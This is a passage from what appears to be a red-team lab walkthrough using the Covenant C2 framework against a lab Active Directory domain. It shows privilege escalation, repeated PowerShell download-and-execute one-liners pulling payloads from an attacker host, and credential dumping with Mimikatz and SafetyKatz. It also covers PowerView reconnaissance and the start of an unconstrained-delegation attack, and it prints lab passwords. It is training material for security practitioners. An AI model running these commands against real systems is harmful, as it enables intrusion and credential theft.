<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SeatBelt</span>.</span></span>exe CredFiles, Patches<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image56.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image57.png" srcset="/img/loading.gif"></p>
<p>As the tool is built-in, you don’t have to manually transfer it to victim machine. Once your grunt is active, you need to go to Tasks and choose the proper command. In this case we will invoke all the checks:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image58.png" srcset="/img/loading.gif"></p>
<p>This task can also be executed on win10-web. Below you can see part of the output from the module.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image59.png" srcset="/img/loading.gif"></p>
<p><strong>Note that there are no specific lab objectives to be obtained during that action.</strong></p>
<h2 id="Privilege-escalation-with-Covenant"><a href="#Privilege-escalation-with-Covenant" class="headerlink" title="Privilege escalation with Covenant"></a>Privilege escalation with Covenant</h2><p>Another task that you might want to conduct during a red team engagement is privilege escalation. <strong>Note, that in this task you already have admin access, so this is not necessary to progress in our lab.</strong></p>
<p>Let us remind you in that point that escalating privileges is a noisy activity and can lead to detection. However, the advantages of achieving administrative/system privileges are obvious - you can for example plunder the machine for clear-text passwords or use it as a fully controlled pivot point to another network. Performing privilege escalation is only advised when there are reasons to do so. Again - a red team engagement is not a CTF and you will not get additional points for escalating your privileges.</p>
<p>Using Covenant you will be able to transfer privilege escalation-assisting software to the remote machine, such as:</p>
<ul>
<li><p>  SharpUp <a target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpUp">https://github.com/GhostPack/SharpUp</a></p>
</li>
<li><p>  PowerUp <a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1</a></p>
</li>
</ul>
<p>Moreover, there are tools like exploit suggesters that will allow you to enumerate missing patches (along with suggested exploits). You might also want to use Sherlock &amp; Watson <a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a>, <a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Watson">https://github.com/rasta-mouse/Watson</a></p>
<p>In order to run Watson on the remote machine, you need to transfer it yourself. Let’s first start by downloading it from github:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image60.png" srcset="/img/loading.gif"></p>
<p>Open the .sln in Visual Studio and compile it as Release / Any CPU. After compilation, move Watson.exe to your attacker machine.</p>
<p>Go to Grunts - Tasks and choose “Assembly”. Then, pick the Watson.exe and proceed with the task:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image61.png" srcset="/img/loading.gif"></p>
<p>Exploring privilege escalation vectors is also possible through SharpUp. In contrary to Watson, SharpUp is already built-in into Covenant. SharpUp is also available as a standalone tool.</p>
<p>To use it from within Covenant, simply go to “Grunts” -&gt; “Task” and choose SharpUp. After a short while you should be able to see results of your action in the “Taskings” section:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image62.png" srcset="/img/loading.gif"></p>
<p>In that case, we have already took over an administrative user. However, due to User Account Control we first need to elevate our process’ integrity before we can have a real impact on underlying system.</p>
<h2 id="Elevation-from-administrator-to-System"><a href="#Elevation-from-administrator-to-System" class="headerlink" title="Elevation from administrator to System"></a>Elevation from administrator to System</h2><p>During post-exploitation activities you might want to elevate from an Administrative, High integrity context to SYSTEM. This might allow you to accomplish more on the target machine. Let’s first start with the <strong>ProcessList Task</strong> and choose a service running as SYSTEM. We can observe a vmware related daemon which might be a good target.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image63.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image64.png" srcset="/img/loading.gif"></p>
<p>Next step will be to use task “ImpersonateProcess” specifying the above process ID as an argument. We can see that Covenant successfully executed the task. Let’s execute WhoAmI again to see if it worked:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image65.png" srcset="/img/loading.gif"></p>
<p>Indeed, now we are running as SYSTEM integrity.</p>
<p>We can now spawn another grunt by entering the “interact” tab and executing</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">powershell</span> iex (new-object net.webclient).downloadstring(&#x27;http://<span class="hljs-number">10.100.10.2</span>/<span class="hljs-number">1</span>.ps<span class="hljs-number">1</span>&#x27;)<br></code></pre></div></td></tr></table></figure>

<p>Soon, we will receive a separate SYSTEM grunt</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image66.png" srcset="/img/loading.gif"></p>
<p>We can always return back to the original context by using “RevertToSelf” command.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image67.png" srcset="/img/loading.gif"></p>
<h2 id="Compromising-Jumpbox"><a href="#Compromising-Jumpbox" class="headerlink" title="Compromising Jumpbox"></a>Compromising Jumpbox</h2><p>In order to compromise Jumpbox, administrative credentials of a local administrator are given. Feel free to use any tool that abuses them to gain initial access. For example, we use PsEXEC.py from impacket with the credentials of Administrator user:</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">/root/impacket/examples/psexec.py Administrator:Summer2020\!@10.100.10.250<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image68.png" srcset="/img/loading.gif"></p>
<p>Now, create a Covenant launcher and execute it on Jumpbox:</p>
<p>We are starting with a listener on the tap0 interface’s IP address:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image69.png" srcset="/img/loading.gif"></p>
<p>Create a binary launcher this time and download it to your system.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image70.png" srcset="/img/loading.gif"></p>
<p>Then, rename it to launcher.exe and move it to a directory which will be exposed using a webserver.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image71.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image72.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image73.png" srcset="/img/loading.gif"></p>
<p>As already discussed, you can also create the grunt using a PS oneliner once in the psexec terminal:</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">powershell</span> iex (new-object net.webclient).downloadstring(&#x27;http://<span class="hljs-number">10.100.10.2</span>/<span class="hljs-number">1</span>.ps<span class="hljs-number">1</span>&#x27;)<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image74.png" srcset="/img/loading.gif"></p>
<p>A new grunt should be spawned.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image75.png" srcset="/img/loading.gif"></p>
<h2 id="Extending-foothold-on-Jumpbox"><a href="#Extending-foothold-on-Jumpbox" class="headerlink" title="Extending foothold on Jumpbox"></a>Extending foothold on Jumpbox</h2><p>Similarly to WIN10-WEB, you can find e.g. using nmap that RDP is enabled on Jumpbox. Try to create another grunt by logging in. This is an additional grunt that we can utilize for further tasks related to analyst1. <strong>Imagine that this grunt with analyst1 privileges is obtained after successful phishing is performed.</strong> The credentials to use are: <strong>ELS-CHILD\analyst1</strong> and <strong>a1@3L$-CHILDL0c@l</strong></p>
<p>For better stability, we use native windows RDP client (feel free to use any kali client like rdesktop if you want).</p>
<p>In order to do that, enable socat on Kali</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">socat</span> tcp-l:<span class="hljs-number">65520</span>,fork tcp:<span class="hljs-number">10.100.10.250:65520</span><br></code></pre></div></td></tr></table></figure>

<p>and then use mstsc.exe from a windows machine with target [Kali IP]:65520</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image76.png" srcset="/img/loading.gif"></p>
<p>As already mentioned, we will use the credentials of a simple domain user (<strong>analyst1</strong>) to establish yet another Covenant grunt (that has domain user privileges). This grunt will be handy in order to experience starting with low privileges on the domain.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image77.png" srcset="/img/loading.gif"></p>
<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">iex</span> (<span class="hljs-built_in">new-object</span> net.webclient).downloadstring(‘http://<span class="hljs-number">10.100</span>.<span class="hljs-number">10.2</span>/<span class="hljs-number">1</span>.ps1’)<br></code></pre></div></td></tr></table></figure>

<p><strong>The grunt we created will be later used in various scenarios that include analyst1 user as a starting point.</strong></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image78.png" srcset="/img/loading.gif"></p>
<p>If we execute the command “net localgroup Administrators” it will show us who is a member of the local administrators group.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image79.png" srcset="/img/loading.gif"></p>
<p>It looks like domain user victim is administrator also on that workstation. As we are already on RDP, we can spawn another grunt through new PowerShell window which is “Run as Administrator” and ELS-CHILD\victim credentials are typed there.</p>
<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">iex</span> (<span class="hljs-built_in">new-object</span> net.webclient).downloadstring(<span class="hljs-string">&#x27;http://10.100.10.2/1.ps1&#x27;</span>)<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image80.png" srcset="/img/loading.gif"></p>
<p>A new high integrity grunt is spawned.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image81.png" srcset="/img/loading.gif"></p>
<h2 id="Dumping-credentials-with-Covenant"><a href="#Dumping-credentials-with-Covenant" class="headerlink" title="Dumping credentials with Covenant"></a>Dumping credentials with Covenant</h2><p>As a high integrity process, we can now run other elevated-only tasks, for example dumping LsaCache through the Task below.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image82.png" srcset="/img/loading.gif"></p>
<p>Also the task Mimikatz with a command of “sekurlsa::logonpassword” gives interesting results: Domain administrator credentials.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image83.png" srcset="/img/loading.gif"></p>
<p>The “WDigest” task gives similar results.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image84.png" srcset="/img/loading.gif"></p>
<p>It was possible to obtain domain administrator credentials. Equipped with them, you can execute any task described in this scenario as non-local.</p>
<h2 id="Dumping-credentials-with-safetykatz"><a href="#Dumping-credentials-with-safetykatz" class="headerlink" title="Dumping credentials with safetykatz"></a>Dumping credentials with safetykatz</h2><p>We can also try a Task named SafetyKatz. The standalone version of that project is available on GitHub (<a target="_blank" rel="noopener" href="https://github.com/GhostPack/SafetyKatz">https://github.com/GhostPack/SafetyKatz</a>) and as the creators describe it, it is a “combination of slightly modified version of <a target="_blank" rel="noopener" href="https://twitter.com/gentilkiwi">@gentilkiwi</a>‘s <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/">Mimikatz</a> project and <a target="_blank" rel="noopener" href="https://twitter.com/subtee">@subtee</a>‘s <a target="_blank" rel="noopener" href="https://github.com/re4lity/subTee-gits-backups/blob/master/PELoader.cs">.NET PE Loader</a>.” It is also built it into Covenant, so we can simply invoke it through a Task named “SafetyKatz” and wait a bit for the results:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image85.png" srcset="/img/loading.gif"></p>
<p>Note down the credentials of the privileged domain user from this exercise - <strong>ELS-CHILD\Administrator</strong> (pass:<code>Admin@3L$-CHILDL0c@l*****</code>)</p>
<p>The password is also automatically stored in the Data tab of Covenant:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image86.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image87.png" srcset="/img/loading.gif"></p>
<h2 id="Impersonating-users-with-Covenant"><a href="#Impersonating-users-with-Covenant" class="headerlink" title="Impersonating users with Covenant"></a>Impersonating users with Covenant</h2><p>If there is no RDP access, or just to try an alternate way of using domain credentials, you can use the impersonate utility of Covenant.</p>
<p>Once you have access to a workstation, you can use the credentials of the domain user analyst1 in order to impersonate a low privileged user. Moreover, any domain user can be impersonated this way. Analyst1’s credentials can be found below.</p>
<p>analyst1 <strong>:</strong> a1@3L$-CHILDL0c@l</p>
<p>In order to impersonate analyst1, we will need first to create his token. Go to the grunt and choose the “MakeToken” task:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image88.png" srcset="/img/loading.gif"></p>
<p>Then run it and go to the “interact” tab</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image89.png" srcset="/img/loading.gif"></p>
<p>Check your identity with whoami:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image90.png" srcset="/img/loading.gif"></p>
<p>Now, prepare your PowerShell launcher. Go to Launchers -&gt; PowerShell -&gt; Click “generate”. Then “host”. You must have done this already during the previous tasks. If not, choose filename and click Host. We chose 1.ps1 for our payload.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image91.png" srcset="/img/loading.gif"></p>
<figure class="highlight scss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scss">powershell -Sta -Nop -Window Hidden -Command &quot;iex (New-Object Net.WebClient)<span class="hljs-selector-class">.DownloadString</span>(&#x27;http://<span class="hljs-number">10.100</span>.<span class="hljs-number">10.2</span>/<span class="hljs-number">1</span>.ps1&#x27;)&quot;<br></code></pre></div></td></tr></table></figure>

<p>we shorten it to:</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">powershell</span> iex (New-Object Net.WebClient).DownloadString(&#x27;http://<span class="hljs-number">10.100.10.2</span>/<span class="hljs-number">1</span>.ps<span class="hljs-number">1</span>&#x27;)<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image92.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image93.png" srcset="/img/loading.gif"></p>
<p>Now, you can use the newly created analyst1 grunt. This scenario might be helpful when compromising the Jumpbox machine. Even though you have SYSTEM access, you would still want to interact with the domain, so you can use this technique along with the given or any other gathered credentials. However, you might need to elevate your permissions using an UAC bypass.</p>
<h1 id="DOMAIN-ATTACKS"><a href="#DOMAIN-ATTACKS" class="headerlink" title="DOMAIN ATTACKS"></a>DOMAIN ATTACKS</h1><h2 id="Starting-point"><a href="#Starting-point" class="headerlink" title="Starting point"></a>Starting point</h2><p>At this point, if you followed along the exercises, you have obtained following credentials:</p>
<p><strong>ELS-CHILD\Analyst1</strong>, who is an unprivileged domain user</p>
<p><strong>ELS-CHILD\victim</strong>, who is a local administrator and a domain user</p>
<p><strong>ELS-CHILD\Administrator</strong> who is the Domain Administrator</p>
<ul>
<li><p>  <strong>Note, that you are free to use RDP for debugging purposes anytime you want.</strong></p>
</li>
<li><p>  Whenever you need a medium integrity grunt you can do again the exercise with <strong>Analyst1</strong></p>
</li>
<li><p>  For High integrity grunt, use the <strong>victim</strong> grunt. <strong>Domain admin</strong> will also work, but you might miss the ability to showcase real impact (since he has domain-wide access already).</p>
</li>
<li><p>  For domain persistence and cross-domain tasks use a <strong>Domain administrator grunt with high integrity.</strong> As you already know the credentials, you can achieve it in the same way you obtained victim grunt.</p>
</li>
</ul>
<h2 id="Domain-Reconnaissance"><a href="#Domain-Reconnaissance" class="headerlink" title="Domain Reconnaissance"></a>Domain Reconnaissance</h2><p>For domain reconnaissance you can use PowerView, which can be downloaded from its GitHub page:</p>
<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</a></p>
<p>Save it in a file on your attacker machine. We have it at /tmp/PowerView.ps1. Now go to the Grunt which is member of a domain and run a PowerShellImport Task, as follows</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image94.png" srcset="/img/loading.gif"></p>
<p>You should be able to see confirmation of the import when successful in the Taskings tab:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image95.png" srcset="/img/loading.gif"></p>
<p>You can also upload PowerView (risking detection) and try to import it using Import-Module</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image96.png" srcset="/img/loading.gif"></p>
<p>Next, go to the same Grunt on which you imported PowerView and open the “Interact” Tab.</p>
<p>PowerView utilizes, among others, RSAT (Remote Server Administration Tools) which is an optional feature installed on Windows environments. Unfortunately, by default it is not installed. You can recognize its presence by simply trying to issue e.g. Get-Domain cmdlet.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image97.png" srcset="/img/loading.gif"></p>
<p>Lack of output or error means that your PowerView features will be limited on that workstation.</p>
<p>In our case, we don’t have RSAT Enabled. Cmdlets of interest might be the following.</p>
<p>Remember to work in an elevated context (High integrity)</p>
<ul>
<li><p>  Find-LocalAdminAccess helps you to figure out where local admin can enter</p>
</li>
<li><p>  Get-NetLoggedOn (e.g. Get-NetLoggedOn -ComputerName uatserver)</p>
</li>
<li><p>  Get-NetSession (e.g. Get-NetSession -ComputerName uatserver)</p>
</li>
<li><p>  Invoke-Sharefinder (Medium integrity)</p>
</li>
</ul>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image98.png" srcset="/img/loading.gif"></p>
<p>Reconnaissance conducted that way might be helpful when you are looking for a limited amount of information. For big volumes of AD information it is better to use BloodHound.</p>
<h2 id="Domain-reconnaissance-II"><a href="#Domain-reconnaissance-II" class="headerlink" title="Domain reconnaissance II"></a>Domain reconnaissance II</h2><p>Our starting point for the second reconnaissance exercise will be a grunt originating from the <strong>jumpbox</strong> workstation with a medium integrity process and a domain user named Analyst1</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image99.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image100.png" srcset="/img/loading.gif"></p>
<p>You will need to import PowerView, which has already been presented. As PowerView is imported, we can enumerating. Listing users is possible with:</p>
<figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm"><span class="hljs-symbol">Powershell</span> <span class="hljs-meta">Get</span>-NetUser<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image101.png" srcset="/img/loading.gif"></p>
<p>We can select only accountnames by piping the output to “select samaccountname”</p>
<figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">powershell</span> Get-NetUser | <span class="hljs-literal">select</span> samaccountname<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image102.png" srcset="/img/loading.gif"></p>
<p>Enumerating computers in the domain can be done using the below command</p>
<figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm"><span class="hljs-symbol">Powershell</span> <span class="hljs-meta">Get</span>-NetComputer<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image103.png" srcset="/img/loading.gif"></p>
<p>Let’s try to explore some Active Directory groups. For example Domain admins:</p>
<figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm"><span class="hljs-symbol">powershell</span> <span class="hljs-meta">Get</span>-NetGroup -GroupName <span class="hljs-string">&quot;Domain Admins&quot;</span> -FullData<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image104.png" srcset="/img/loading.gif"></p>
<p>Following down that path, you can extract members of the domain administrator group:</p>
<figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm"><span class="hljs-symbol">powershell</span> <span class="hljs-meta">Get</span>-NetGroupMember -GroupName <span class="hljs-string">&quot;Domain Admins&quot;</span> -FullData<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image105.png" srcset="/img/loading.gif"></p>
<p>We can also try to find accessible network shares</p>
<figure class="highlight coq"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coq">powershell Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC -<span class="hljs-keyword">Verbose</span><br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image106.png" srcset="/img/loading.gif"></p>
<p>Both of them are network logon shares.</p>
<figure class="highlight mathematica"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mathematica"><span class="hljs-variable">powershell</span> <span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">NetGPOGroup</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Verbose</span><br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image107.png" srcset="/img/loading.gif"></p>
<p>We can also list Organizational Units using powershell Get-NetOU</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image108.png" srcset="/img/loading.gif"></p>
<p>…and domain policies using powershell Get-NetGPO</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image109.png" srcset="/img/loading.gif"></p>
<h2 id="Rubeus-inside-Covenant"><a href="#Rubeus-inside-Covenant" class="headerlink" title="Rubeus inside Covenant"></a>Rubeus inside Covenant</h2><p>Now we will continue leveraging the AD infrastructure of this lab to practice various attacks against Active Directory using Covenant.</p>
<p>When starting your Covenant listener make sure that the connect-back address of the launchers is the same as your tap0 IP address and if that the port is exposed through Docker (if you are running Covenant from Docker)</p>
<p>Create a high integrity grunt using a Powershell Launcher from the Jumpbox machine. Now, let’s try with the first task - Rubeus.</p>
<p>Rubeus, is also available on its GitHub page <a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a> as a standalone tool, however, we can conveniently use it within Covenant.</p>
<p>Let’s go to Tasks and issue the following command:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image110.png" srcset="/img/loading.gif"></p>
<p>Then you should be able to see the results in Taskings:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image111.png" srcset="/img/loading.gif"></p>
<h2 id="Exploiting-Unconstrained-Delegation"><a href="#Exploiting-Unconstrained-Delegation" class="headerlink" title="Exploiting Unconstrained Delegation"></a>Exploiting Unconstrained Delegation</h2><p>Let’s now try to exploit Unconstrained Delegation using Covenant and Rubeus.</p>
<p>We have hooked a machine that allows for unconstrained delegation. Its hostname is win10-web.</p>
<p>Our session is a high integrity one.</p>
<p>First, let’s also gather some prerequisites. For exploiting unconstrained delegation, you will need to trigger the so-called “printer bug”, which can be triggered using a PoC available on GitHub:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a></p>
<p>SpoolSample can be easily compiled using Visual Studio as Release x64. We will transfer the result file SpoolSample.exe to the Kali machine.</p>
<p>We will also need to transfer it later to the victim machine. You can do it in any preferred way, e.g.</p>
<ul>
<li><p>  Upload using Covenant task</p>
</li>
<li><p>  Use raw powershell and python simple http server (powershell curl <a target="_blank" rel="noopener" href="http://10.100.10.2:9999/SpoolSample.exe%20-outfile%20spo.exe">http://10.100.10.2:9999/SpoolSample.exe -outfile spo.exe</a>)</p>
</li>
</ul>
<p>Currently we have a high integrity grunt on win10-web.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image112.png" srcset="/img/loading.gif"></p>
<p>We will try to exploit unconstrained delegation against child-dc01</p>
<p>We will also need Rubeus (<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a>).</p>
<p>First, let’s check in Interact if we have successfully transferred SpoolSample.exe</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image113.png" srcset="/img/loading.gif"></p>
<p>We also compile Rubeus (<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a>) with .NET version 3.5. Let’s also transfer Rubeus.exe to the remote workstation</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">powershell curl http://10.100.10.2:9999/rubeus.exe -outfile c:<span class="hljs-symbol">\u</span>sers<span class="hljs-symbol">\A</span>dministrator.ELS-CHILD<span class="hljs-symbol">\r</span>ubeus.exe<br></code></pre></div></td></tr></table></figure>

<p>We can now start it:</p>
